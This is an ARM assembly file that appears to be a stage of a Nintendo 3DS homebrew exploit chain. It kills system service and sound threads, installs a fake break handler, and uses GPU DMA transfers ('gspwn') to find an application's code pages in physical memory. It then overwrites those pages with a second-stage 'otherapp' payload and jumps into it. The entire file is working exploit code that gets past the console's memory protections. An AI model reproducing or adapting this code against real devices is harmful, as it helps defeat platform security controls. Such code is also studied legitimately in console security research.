	.arm
	@ I'm about to commit sin with these branch abstractions
	#define HELPERAPP_TARGET_ADDR 0x100000
	#define TEXTABSTRACTPTR(x) (miniapp + ((x) - HELPERAPP_TARGET_ADDR))
	#define HELPERRELATIVEPTR(x) (HELPERAPP_TARGET_ADDR + ((x) - miniapp))
	#define OTHERAPP_BINLOAD_SIZE 0xC000
	#define MAKERESULT(level,summary,module,description) ((((level)&0x1F)<<27) | (((summary)&0x3F)<<21) | (((module)&0xFF)<<10) | ((description)&0x3FF))
	@ some of the things here could be a lot cleaner
	@ but hey, what can one expect of hand writen assembly sometimes
miniapp:
	mov sp, r1
	adr r6, .Lthread_kill_data
	ldm r6!, {r1-r5} @ after execute, r6 now == addr .Lsome_thread_data
	ldr r1, [r1] @ get srv notification handle
	str r4, [r3] @ set break handler ptr to our svc 9
	svc 0x16 @ we release the srv semaphore get it out of waiting. It will panic due to the lack of a real srv notification
	bl CmpThrow @ throw error if bad result
	mov r0, r5
	bl TEXTABSTRACTPTR(Thread_Exit)
	ldm r6!, {r0-r1,r4,r7} @ after execute, r6 == addr .Lnullptr
	mov r5, #1
	strb r5, [r1] @ stop flag
	ldr r0, [r0] @ event handle, will wake up the thread
	svc 0x18 @ signal event
	bl CmpThrow @ throw error if bad result
	mov r0, r4
	bl TEXTABSTRACTPTR(Thread_Exit)
	strb r5, [r7, #20] @ stop flag
	strb r5, [r7, #40] @ stop flag
	str r5, [r7, #92] @ break loop out data
	str r5, [r7, #96] @ breaking out as well
	str r6, [r7, #56] @ having it point to a 0 will also serve as a stop for one part of the thread loop
	mov r1, #1
	add r0, r7, #60 @ waiting LightSemaphore's position
	bl TEXTABSTRACTPTR(LightSemaphore_Release) @ give it a reason to continue, the thread should be in wait
	mov r0, r7
	bl TEXTABSTRACTPTR(Thread_Exit)
	@ how convenient, there's a function to stop one the threads
	bl TEXTABSTRACTPTR(DSP_ThreadStop)
	@ lets clear some handles
	bl TEXTABSTRACTPTR(SOUND_CLEAR1)
	bl TEXTABSTRACTPTR(SOUND_CLEAR2)
	bl TEXTABSTRACTPTR(DSP_Exit)
	ldm r6!, {r0, r4, r5} @ hop over .Lnullptr with r1. After execute, r6 == addr .Lotherapp_stackaddr
	sub sp, sp, r5, lsl #2
	mov r2, r5
	mov r1, r4
	mov r0, sp
	bl find_vmem_pages
	mov r0, sp
	mov r1, r5
	bl copy_otherapp_from_save_to_text
	add sp, sp, r5, lsl #2
	mov r0, #ROPKIT_BEFOREJUMP_CACHEBUFADDR
	mov r1, #ROPKIT_BEFOREJUMP_CACHEBUFSIZE
	bl TEXTABSTRACTPTR(GSPGPU_FlushDataCache)
	bl CmpThrow @ throw error if bad result
	ldm r6, {r5-r10} @ we've read .Lotherapp_stackaddr + .Lotherapp_data
	@ now we setup the paramblk for otherapp
	mov r0, r6
	mov r1, #0x1000
	bl TEXTABSTRACTPTR(MEMSET32_OTHER)
	str r7, [r6, #0x1C]
	str r8, [r6, #0x20]
	str r9, [r6, #0x48]
	str r10, [r6, #0x58]
	mov r0, r6
	mov r1, r5
	bx r4
.Lthread_kill_data:
	.word SRV_Notification_Semaphore
	.word 1
	.word BreakHandlerPtr
	.word HELPERRELATIVEPTR(fake_break_handler)
	.word SRV_THREAD_HANDLE
.Lsome_thread_data:
	.word SOMETHREAD1EVENT @ event handle ptr
	.word SOMETHREAD1TERMINATIONFLAG @ thread termination flag
	.word SOMETHREAD1OBJ @ thread object
.Lsome_thread_other_data:
	.word SOMETHREAD2OBJ @ another thread object and others (sound related?)
.Lnullptr:
	.word 0 @ nullptr
.Ltarget_otherapp:
	.word 0x101000
	.word 0xC
.Lotherapp_stackaddr:
	.word (0x10000000-4)
.Lotherapp_data:
	.word ROPKIT_LINEARMEM_BUF
	.word GXLOW_CMD4
	.word GSPGPU_FlushDataCache
	.word 0x8d @ Flags
	.word GSPGPU_SERVHANDLEADR

fake_break_handler:
	svc 0x09

CmpThrow:
	movs r0, r0
	bxpl lr
Throw:
	mov r1, lr
	b TEXTABSTRACTPTR(ERRF_THROW) @ bad result, throw error

@ search through paslr
@ r0/r7 - array of linear offsets (excepts accessable length to be 4*r2)
@ r1/r8 - text address target
@ r2/r9 - target text page count
@ returns nothing
@ throws error to err:f
find_vmem_pages:
	push {r0-r2, r4-r5, r7-r9, r10-r11, lr}
	mov r1, r2, lsl #2
	bl TEXTABSTRACTPTR(MEMSET32_OTHER)
	pop {r7-r9}
	adr r3, .Lappmemcheck
	ldm r3, {r3, r11}
	ldr r3, [r3] @ get APPMEMTYPE
	ldr r4, [r11, r3, lsl #2]
	mov r11, #ROPKIT_LINEARMEM_REGIONBASE
	add r4, r4, r11
	add r10, r11, #0x100000
	mov r5, r9
	@ r10 - Work buffer
	@ r11 - Linear base
	@ r4 - next read address
	@ r5 - total of found pages, stops when r5 == arg3, throws error if r5 > arg3
	@ transfer size 0x100000
vmem_search_loop:
	sub r4, r4, #0x100000
	cmp r4, r11
	ldreq r0, .Lvmem_search_error_notfound
	bleq Throw
	cmp r4, r10
	beq vmem_search_loop @ skip, r4 == r10
	mov r0, r4
	mov r1, r10
	mov r2, #0x100000
	mov r3, r10
	bl flush_and_gspwn
	mov r0, r10
	mov r1, r8
	mov r2, r9
	mov r3, r7
	mov r12, r4
	bl search_linear_buffer
	subs r5, r5, r0
	popeq {r4-r5, r7-r9, r10-r11, pc} @ exit if all found
	bpl vmem_search_loop @ continue if there are any left to find
	ldr r0, .Lvmem_search_error_duplicatefinds @ if we hit this, we found multiple instances of the same page and over counted
	bl Throw
.Lappmemcheck:
	.word 0x1FF80030
	.word ropkit_appmemtype_appmemsize_table
.Lvmem_search_error_notfound:
	.word MAKERESULT(0x1F, 4, 254, 0x3EF) @ fatal, not found, application, no data
.Lvmem_search_error_duplicatefinds:
	.word MAKERESULT(0x1F, 5, 254, 0x3FC) @ fatal, invalid state, application, already exists

@ unconventional function arguments, but screw accessing stack arguments
@ r0/r5 - linear buffer to search
@ r1/r6 - text address target
@ r2/r7 - target text page count
@ r3/r8 - array of linear offsets (excepts accessable length to be 4*r2)
@ r12/r10 - currently searching linear offset (offset copied out with gspwn to buffer)
@ returns:
@ r0 - total pages found
search_linear_buffer:
	push {r0-r3, r4-r10, r11, lr}
	pop {r5-r8}
	mov r10, r12
	mov r11, #0
	@ we are going from end to start
	mov r4, #0x100
search_linear_buffer_loop:
	subs r4, r4, #1
	bmi search_linear_buffer_loop_end
	mov r9, r7
text_page_cmp_loop:
	subs r9, r9, #1
	bmi search_linear_buffer_loop
	add r0, r5, r4, lsl #12
	add r1, r6, r9, lsl #12
	mov r2, #0x1000
	bl memcmp32
	movs r0, r0
	bne text_page_cmp_loop
	add r0, r10, r4, lsl #12
	str r0, [r8, r9, lsl #2]
	add r11, r11, #1
	b text_page_cmp_loop
search_linear_buffer_loop_end:
	mov r0, r11
	pop {r4-r10, r11, pc}

@ r0 - linear .text vmem array
@ r1 - page count
copy_otherapp_from_save_to_text:
	push {r0-r1, r4-r5, r7, lr}
	pop {r4-r5}
	adr r7, .Lotherapp_spaces
	ldm r7, {r0-r2}
	mov r7, r0
	bl TEXTABSTRACTPTR(MEMCPY)
otherapp_gspwn_loop:
	subs r5, r5, #1
	popmi {r4-r5, r7, pc}
	add r0, r7, r5, lsl #12
	ldr r1, [r4, r5, lsl #2]
	mov r2, #0x1000
	mov r3, r0
	bl flush_and_gspwn
	b otherapp_gspwn_loop
.Lotherapp_spaces:
	.word ROPKIT_LINEARMEM_BUF @ work space
	.word __otherapp_start__ @ save source
	.word __otherapp_size__ @ size

@ except 32bit aligned and length all the way
memcmp32:
	push {lr}
	mov lr, r0
memcmp32_loop:
	subs r2, r2, #4
	movmi r0, #0
	popmi {pc}
	ldr r3, [lr], #4
	ldr r12, [r1], #4
	subs r0, r3, r12
	popne {pc}
	b memcmp32_loop

@ r0 - source
@ r1 - destination
@ r2 - size
call_gxlow_cmd4:
	push {lr}
	mov r12, #8
	mvn r3, #0
	push {r3, r12}
	mvn r12, #0
	push {r3, r12}
	@ return GXLOW_CMD4(source, destination, size, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0x8)
	bl TEXTABSTRACTPTR(GXLOW_CMD4)
	pop {r1-r3, r12, pc} @ pop to 4 scratch registers to do same as add sp, sp, #16

@ r0 - source
@ r1 - destination
@ r2 - size
@ r3 - flush address
flush_and_gspwn:
	push {r0-r2, lr}
	mov r0, r3
	mov r1, r2
	bl TEXTABSTRACTPTR(GSPGPU_FlushDataCache)
	bl CmpThrow
	pop {r0-r2}
	bl call_gxlow_cmd4
	bl CmpThrow
	ldr r0, .Lsleep_transfer_half
	mov r1, #0
	svc 0x0A
	pop {pc}
.Lsleep_transfer_half:
	.word 150000000

miniappend:
